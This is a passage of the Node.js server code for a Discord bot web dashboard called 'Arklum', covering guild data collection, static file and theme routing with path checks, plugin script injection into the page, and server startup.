    socket.emit('error', { message: 'Bot not connected' });
    return;
  }
  const guildId = data.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;
  const channels = [];
  for (const ch of guild.channels.cache.values()) {
    if (ch.type === ChannelType.GuildText) {
      channels.push({ id: String(ch.id), name: ch.name, type: 'text', position: ch.position, category_id: ch.parent ? String(ch.parent.id) : null, topic: ch.topic || '', nsfw: ch.nsfw, slowmode_delay: ch.rateLimitPerUser });
    } else if (ch.type === ChannelType.GuildVoice) {
      const linkedText = bot.channels.cache.find(c => c.type === ChannelType.GuildText && c.parentId === ch.id);
      channels.push({ id: String(ch.id), name: ch.name, type: 'voice', position: ch.position, category_id: ch.parent ? String(ch.parent.id) : null, user_limit: ch.userLimit, bitrate: ch.bitrate, linked_text_channel_id: linkedText ? String(linkedText.id) : null });
    }
  }
  const roles = guild.roles.cache.sort((a, b) => b.position - a.position).map(role => ({ id: String(role.id), name: role.name, color: role.color, position: role.position, permissions: Number(role.permissions.bitfield), hoist: role.hoist, mentionable: role.mentionable }));
  const members = guild.members.cache.map(member => {
    let customStatus = '';
    for (const act of member.presence?.activities || []) {
      if (act.type === ActivityType.Custom) {
        customStatus = act.name || '';
        break;
      }
    }
    return {
      id: String(member.id),
      name: member.displayName,
      username: member.user.tag,
      avatar_url: member.displayAvatarURL({ format: 'png', size: 128 }),
      bot: member.user.bot,
      status: member.presence?.status || 'offline',
      custom_status: customStatus,
      voice_channel_id: member.voice?.channel ? String(member.voice.channel.id) : null,
      roles: member.roles.cache.filter(r => r.name !== '@everyone').map(r => String(r.id))
    };
  });
  const categories = guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).map(cat => ({ id: String(cat.id), name: cat.name, position: cat.position }));
  socket.emit('guild_details', {
    id: String(guild.id),
    name: guild.name,
    icon_url: guild.icon ? guild.iconURL({ format: 'png', size: 128 }) : null,
    banner_url: guild.banner ? guild.bannerURL({ format: 'png', size: 512 }) : null,
    member_count: guild.memberCount,
    description: guild.description || '',
    verification_level: guild.verificationLevel,
    explicit_content_filter: guild.explicitContentFilter,
    owner_perms: {},
    channels,
    roles,
    members,
    categories
  });
}
const MIME_TYPES = {
  '.html': 'text/html',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.png': 'image/png',
  '.gif': 'image/gif',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
  '.ico': 'image/x-icon'
};
async function serveStaticFile(filePath, res) {
  try {
    const data = await fs.promises.readFile(filePath);
    const ext = path.extname(filePath).toLowerCase();
    res.writeHead(200, { 'Content-Type': MIME_TYPES[ext] || 'application/octet-stream' });
    res.end(data);
  } catch {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
}
function serveDashboardHtml(res) {
  try {
    let html = fs.readFileSync('static/arklum.html', 'utf8');
    try {
      const pluginsLoader = require('./plugins/loader');
      const { cssList, jsList } = pluginsLoader.get_all_injections();
      const parts = [];
      if (cssList.length) parts.push(`<style>${cssList.join('\n')}</style>`);
      if (jsList.length) parts.push(`<script>${jsList.join('\n')}</script>`);
      html = html.replace('<!-- PRESET_SCRIPT -->', parts.join('\n') || '');
    } catch {}
    const forge = getForgeChunk();
    if (forge) html = html.replace('</body>', forge + '\n</body>');
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  } catch {
    res.writeHead(500, { 'Content-Type': 'text/html' });
    res.end('<html><body>Error loading dashboard</body></html>');
  }
}
const SPA_ROUTES = /^\/(login|home|servers|server|chat|settings|bot|utility|plugins|plugin|server|chat|dms|overview|channels|members|roles|bans|audit|expressions|invites|404)(\/.*)?$/;
async function handleRequest(req, res) {
  if (req.url.startsWith('/socket.io/')) return;
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;
  if (pathname === '/') {
    serveDashboardHtml(res);
    return;
  }
  if (pathname === '/themes/') {
    try {
      const themesDir = path.join('static', 'themes');
      const files = fs.readdirSync(themesDir).filter(f => f.endsWith('.json')).map(f => ({ name: f.replace('.json', '').replace(/-/g, ' ').replace(/\b\w/g, c => c.toUpperCase()), path: `themes/${f}` }));
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(files));
    } catch {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('[]');
    }
    return;
  }
  if (pathname === '/global-theme') {
    const themeFile = path.join(SYS_DIR, 'config', 'theme.json');
    if (fs.existsSync(themeFile)) {
      try {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(JSON.parse(fs.readFileSync(themeFile, 'utf8'))));
        return;
      } catch {}
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ theme_path: 'themes/default.json' }));
    return;
  }
  if (pathname.startsWith('/themes/')) {
    const file = pathname.substring('/themes/'.length);
    if (file.includes('..')) {
      res.writeHead(404);
      res.end();
      return;
    }
    const filePath = path.join('static', 'themes', file);
    const normalized = path.normalize(filePath);
    if (!normalized.startsWith(path.normalize('static/themes'))) {
      res.writeHead(404);
      res.end();
      return;
    }
    return serveStaticFile(normalized, res);
  }
  if (pathname.startsWith('/plugins/')) {
    const parts = pathname.split('/').filter(Boolean);
    if (parts.length >= 2) {
      const filePath = path.join('plugins', parts[1], parts.slice(2).join('/'));
      if (filePath.includes('..')) {
        res.writeHead(404);
        res.end();
        return;
      }
      return serveStaticFile(filePath, res);
    }
    res.writeHead(404);
    res.end();
    return;
  }
  if (pathname.startsWith('/sys-icons/')) {
    const filename = pathname.substring('/sys-icons/'.length);
    if (/^[a-zA-Z0-9_.-]+\.(png|jpg|jpeg|gif|webp|svg)$/.test(filename)) {
      const iconPath = path.join(SYS_DIR, 'icons', filename);
      if (fs.existsSync(iconPath)) return serveStaticFile(iconPath, res);
    }
    res.writeHead(404);
    res.end();
    return;
  }
  if (pathname === '/arklum-broken.svg') return serveStaticFile(path.join('static', 'arklum-broken.svg'), res);
  if (pathname === '/arklum.gif' || pathname === '/arklum.png') return serveStaticFile('arklum.png', res);
  if (pathname === '/app-version') {
    let version = '';
    try {
      const firstLine = fs.readFileSync(path.join(SYS_DIR, 'arkv.md'), 'utf8').split('\n')[0].trim();
      const m = firstLine.match(/v?\d+(\.\d+)*/);
      version = m ? m[0] : firstLine;
    } catch {}
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ version }));
    return;
  }
  if (req.method === 'GET' && SPA_ROUTES.test(pathname)) {
    serveDashboardHtml(res);
    return;
  }
  if (pathname.startsWith('/css/') || pathname.startsWith('/core/') || pathname.startsWith('/shell/') || pathname.startsWith('/pages/') || pathname.startsWith('/fonts/')) {
    const rel = pathname.substring(1);
    if (rel.includes('..')) {
      res.writeHead(404);
      res.end();
      return;
    }
    return serveStaticFile(path.join('static', rel), res);
  }
  if (req.method === 'GET' && /^\/(login|home|servers|server|chat|settings|bot|utility|plugins|plugin|404)(\/|$)/.test(pathname)) {
    try {
      let html = fs.readFileSync('static/arklum.html', 'utf8');
      try {
        const pluginsLoader = require('./plugins/loader');
        const { cssList, jsList } = pluginsLoader.get_all_injections();
        const parts = [];
        if (cssList.length) parts.push(`<style>${cssList.join('\n')}</style>`);
        if (jsList.length) parts.push(`<script>${jsList.join('\n')}</script>`);
        html = html.replace('<!-- PRESET_SCRIPT -->', parts.join('\n') || '');
      } catch {}
      const forge = getForgeChunk();
      if (forge) html = html.replace('</body>', forge + '\n</body>');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(html);
    } catch {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end('<html><body>Error loading dashboard</body></html>');
    }
    return;
  }
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
}
function loadCommandModules() {
  const dir = path.join(__dirname, 'modules', 'commands');
  if (!fs.existsSync(dir)) return;
  for (const f of fs.readdirSync(dir)) {
    if (!f.endsWith('.js')) continue;
    try {
      require(path.join(dir, f));
    } catch (e) {
      logger.error('Failed to load command module ' + f + ': ' + e.stack);
    }
  }
}
async function main() {
  loadCommandModules();
  require('./modules/chat');
  require('./modules/devportal');
  require('./modules/status');
  require('./modules/utility');
  require('./modules/dms');
  require('./modules/memes');
  require('./modules/updater');
  require('./plugins/api');
  require('./plugins/marketplace');
  require('./modules/chatsite');
  require('./modules/webhooks_site');
  const host = process.env.HOST || '0.0.0.0';
  const port = parseInt(process.env.PORT) || 8000;
  httpServer.on('request', handleRequest);
  httpServer.listen(port, host === '0.0.0.0' ? undefined : host, () => {
    console.log(`[ARKLUM] server running at http://${host}:${port}`);
    try {
      const pluginsLoader = require('./plugins/loader');
      pluginsLoader.load_plugins_for_token(-1);
    } catch (e) {
      logger.error('Failed to load global plugins at boot: ' + e.message);
    }
  });
}

function componentsToDict(message) {
  const out = [];
  try {
    for (const row of message.components || []) {
      const buttons = [];
      for (const comp of row.components || []) {
        if (comp.type === 2) {
          buttons.push({
            label: comp.label || null,
            emoji: comp.emoji ? (comp.emoji.name || String(comp.emoji.id)) : null,
            style: comp.style,
            url: comp.url || null,
            disabled: !!comp.disabled
          });
        }
      }
      if (buttons.length) out.push(buttons);
    }
  } catch (e) {}
  return out;
}

module.exports = {
  io,
  getBot,
  registerCommand,
  commandHandlers,
  checkRateLimit,
  rateInfo,
  validateId,
  validateMessageContent,
  renderMessage,
  getAvatarUrl,
  getUserBannerUrl,
  embedToDict,
  classifyAttachment,
  bitsToPermissions,
  permissionNameToFlag,
  actionTypeToName,
  logger,
  getBotDataDir,
  config,
  tokenVault,
  getCurrentBotTokenIndex: () => currentBotTokenIndex,
  setCurrentBotTokenIndex: (idx) => { currentBotTokenIndex = idx; },
  saveEncryptedTokens,
  loadEncryptedTokens,
  resetTokenVault,
  executeWebCommand,
  loadDashboardPrefs,
  saveDashboardPrefs,
  getGuildListWithBanners,
  fetchClientId,
  fetchBotApplicationInfo,
  loadConfig,
  saveConfig,
  clearRuntimeCaches,
  LOG_BUFFER,
  VALID_ID_REGEX,
  SYS_DIR,
  KEY_FILE,
  TOKENS_ENC,
  PAYLOAD_ENC,
  CONFIG_FILE,
  DEFAULT_CONFIG,
  componentsToDict
};
main().catch(err => {
  console.error('Failed to start:', err);
  process.exit(1);
});